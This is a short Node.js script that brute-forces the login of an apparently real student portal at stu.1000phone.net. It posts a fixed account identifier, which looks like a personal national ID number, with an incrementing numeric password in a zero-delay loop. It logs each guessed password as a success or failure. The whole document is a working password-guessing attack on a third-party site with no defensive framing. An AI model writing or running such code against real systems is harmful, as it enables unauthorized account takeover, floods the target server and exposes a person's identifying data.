var request = require('request');
var num = 0;
setInterval(function(){
    request.post({
        url:'http://stu.1000phone.net/student.php/public/login', 
        formData: {
            Account: '44088319920402001X',
            PassWord: num++
        }
    }, function optionalCallback(err, httpResponse, body) {
        console.log('测试密码为',num,body?'失败':'成功')
    //   console.log('Upload successful!  Server responded with:', body);
    });
},0)
